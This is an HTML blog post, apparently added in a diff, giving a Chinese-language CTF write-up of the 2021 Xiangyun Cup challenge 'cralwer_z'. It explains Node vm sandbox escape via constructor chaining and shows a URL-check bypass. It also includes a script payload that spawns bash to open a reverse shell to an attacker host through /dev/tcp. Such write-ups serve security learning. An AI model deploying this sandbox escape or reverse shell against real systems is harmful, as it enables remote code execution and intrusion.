@@ -1,0 +1,145 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="suyumen"><meta name="renderer" content="webkit"><meta name="copyright" content="suyumen"><meta name="keywords" content="SUYUMEN"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>2021祥云杯cralwer_z · SUYUMEN</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">suyumen</div><div class="profile-signature">目前主要在学习web相关</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/back.jpg);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">SUYUMEN</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">2021祥云杯cralwer_z</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-10-12</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="js"> js</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="vm"> vm</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="沙箱逃逸"> 沙箱逃逸</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">1.1k</span> | Reading time: <span class="post-count">5</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>最近的比赛都很有意思，大家的博客也很有意思；但是我没有意思，因为比赛题我都不会做。今天有拟态的决赛，但是为什么我在写博客，就是因为看了题，第一步就被那个我不认识也不认识我的编码难住了，而且我也不想抢了同队大佬们的<code>vpn</code>，阻挡了他们30万奖金的道路。</p>
+<p>于此同时，我也学习到了一个小小的知识点：虽然我没有抢大佬们的<code>vpn</code>，但<code>vpn</code>确实是可以抢占的。以及昨天因为初次接触拟态防御这个概念，特意写了一篇（不是很明白的）调研报告，以多了解这个技术（以当作我的web开发课作业）。</p>
+<p>所以看看以前的比赛题。</p>
+<p>这个祥云杯比赛的题对我而言都好新呐（指都不会做）。</p>
+<hr>
+<p>言归正传，在看各种wp的过程中，我发现这个解题链应当是“危险函数–&gt;代码审计”，就是先找危险函数，找不到再整体审计。然而对于不知道有什么危险函数的我来说，任何题的流程都是“代码审计”。很明显，让我代码审计，就像是让我舍友宝琪姐姐不说话了一样————“开玩笑”。</p>
+<hr>
+<p>如果是我的话，只会发现<code>“cralwer_z”</code>和爬虫相关。但是为什么别人能做出来的，就是因为他们知道：</p>
+<blockquote>
+<p><code>zombie</code>有<code>vm</code>库并且在解析<code>script</code>和<code>url</code>的时候调用<code>runInContext</code>，将<code>script</code>内容作为第一个参数<code>code</code>。</p>
+</blockquote>
+<hr>
+<h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><p><code>vm</code>不安全,就像<code>vm2</code>也不安全。</p>
+<p>这是因为创建<code>vm</code>环境时，首先初始化一个对象<code>sandbox</code>，这个对象就是<code>vm</code>中脚本执行时的全局环境<code>context</code>，全局<code>this</code>指向的就是这个对象。</p>
+<p><code>vm</code>中的<code>this</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">global</span>.secret = <span class="string">&#x27;sss&#x27;</span></span><br><span class="line">context = &#123;<span class="string">&#x27;x&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">vm.createContext(context)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(vm.runInContext(<span class="string">&quot;this&quot;</span>, context)) <span class="comment">// &#123; x: 1 &#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(context.constructor.constructor(<span class="string">&#x27;return this&#x27;</span>)()) <span class="comment">// global </span></span><br></pre></td></tr></table></figure>
+<p><code>context.constructor.constructor</code>获取到的是<code>Function()</code>，用<code>Function()</code>动态创建一个匿名函数，获取<code>this</code>的值，<code>this</code>指向的就是<code>global</code>对象。</p>
+<hr>
+<p>注册<code>admin</code>登录后有个<code>profile</code>路由。看一下源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/profile&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; affiliation, age, bucket &#125; = req.body;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findByPk(req.session.userId);</span><br><span class="line">    <span class="keyword">if</span> (!affiliation || !age || !bucket || <span class="keyword">typeof</span> (age) !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> (bucket) !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> (affiliation) != <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Parameters error or blank.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!utils.checkBucket(bucket)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Invalid bucket url.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> authToken;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            <span class="attr">personalBucket</span>: bucket</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            <span class="attr">where</span>: &#123; <span class="attr">userId</span>: req.session.userId &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">const</span> token = crypto.randomBytes(<span class="number">32</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        authToken = token;</span><br><span class="line">        <span class="keyword">await</span> Token.create(&#123; <span class="attr">userId</span>: req.session.userId, token, <span class="attr">valid</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        <span class="keyword">await</span> Token.update(&#123;</span><br><span class="line">            <span class="attr">valid</span>: <span class="literal">false</span>,</span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            <span class="attr">where</span>: &#123;</span><br><span class="line">                <span class="attr">userId</span>: req.session.userId,</span><br><span class="line">                <span class="attr">token</span>: &#123; [Op.not]: authToken &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        next(createError(<span class="number">500</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^https:\/\/[a-f0-9]&#123;32&#125;\.oss-cn-beijing\.ichunqiu\.com\/$/</span>.exec(bucket)) &#123;</span><br><span class="line">        res.redirect(<span class="string">`/user/verify?token=<span class="subst">$&#123;authToken&#125;</span>`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Well, admin won&#x27;t do that actually XD. </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; <span class="attr">user</span>: user, <span class="attr">message</span>: <span class="string">&quot;Admin will check if your bucket is qualified later.&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>我不明白为什么我看了半天的东西，我只能寥寥几句话来解释`。</p>
+<p>比如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!utils.checkBucket(bucket)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.render(<span class="string">&#x27;user&#x27;</span>, &#123; user, <span class="attr">error</span>: <span class="string">&quot;Invalid bucket url.&quot;</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> authToken;</span><br></pre></td></tr></table></figure>
+
+<p>这里检查过<code>bucket</code>合法后，就设置了<code>authtoken</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> User.update(&#123;</span><br><span class="line">            affiliation,</span><br><span class="line">            age,</span><br><span class="line">            <span class="attr">personalBucket</span>: bucket</span><br><span class="line">        &#125;, &#123;</span><br></pre></td></tr></table></figure>
+
+<p>这里又更新了<code>user</code>信息，尤其是更新了<code>bucket</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="title">checkBucket</span>(<span class="params">url</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            url = <span class="keyword">new</span> URL(url);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (url.protocol != <span class="string">&quot;http:&quot;</span> &amp;&amp; url.protocol != <span class="string">&quot;https:&quot;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (url.href.includes(<span class="string">&#x27;oss-cn-beijing.ichunqiu.com&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里绕过可以类似这样：</p>
+<p><code>http://IP/index.html?aaa=oss-cn-beijing.ichunqiu.com</code></p>
+<p>就可以覆盖掉<code>bucket</code>，换成心机代码段:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;c=<span class="string">&#x27;constructor&#x27;</span>;<span class="built_in">this</span>[c][c](<span class="string">&quot;c=&#x27;constructor&#x27;;require=this[c][c](&#x27;return process&#x27;)().mainModule.require;var sync=require(&#x27;child_process&#x27;).spawnSync; var ls = sync(&#x27;bash&#x27;, [&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/[ip]/port 0&gt;&amp;1&#x27;],);console.log(ls.output.toString());&quot;</span>)()&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发送三次请求，第一次获取<code>token</code>值，第二次请求<code>/user/profile</code>，<code>Bucket</code>赋值为<code>vps</code>的<code>ip</code>。再请求<code>/user/verify?token=[token]</code>，然后通过<code>/user/bucket</code>反弹<code>shell</code>。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.战队wp</p>
+<p>2.<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41636200/article/details/119958733?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.no_search_link">https://blog.csdn.net/qq_41636200/article/details/119958733?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.no_search_link</a></p>
+<p>3.<a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/120147572">https://blog.csdn.net/cjdgg/article/details/120147572</a></p>
+<p>4.<a target="_blank" rel="noopener" href="https://cbatl.gitee.io/2021/08/24/xinagyubbei/">https://cbatl.gitee.io/2021/08/24/xinagyubbei/</a></p>
+<p>5.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13663121.html">https://www.cnblogs.com/ophxc/p/13663121.html</a></p>
+<p>6.<a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1439.html">https://www.redhatzone.com/ask/article/1439.html</a></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://suyumen.github.io">suyumen</a></p><p> <span>Link:  </span><a href="https://suyumen.github.io/2021/10/12/2021-11-01-[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]cralwer_z/">https://suyumen.github.io/2021/10/12/2021-11-01-[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]cralwer_z/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2021/10/12/2021-10-12-%5B2021%E7%A5%A5%E4%BA%91%E6%9D%AF%5Dsecrets_of_admin/" title="2021祥云杯secrets_of_admin"><span>< PreviousPost</span><br><span class="prevTitle">2021祥云杯secrets_of_admin</span></a><a class="nextSlogan" href="/2021/09/10/2021-09-10-%5BHF2021%5Dhatenum/" title="HF2021-hatenum"><span>NextPost ></span><br><span class="nextTitle">HF2021-hatenum</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by <span>Hexo</span></span><span> | theme <span>Cxo</span></span></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#VM"><span class="toc-number">1.</span> <span class="toc-text">VM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
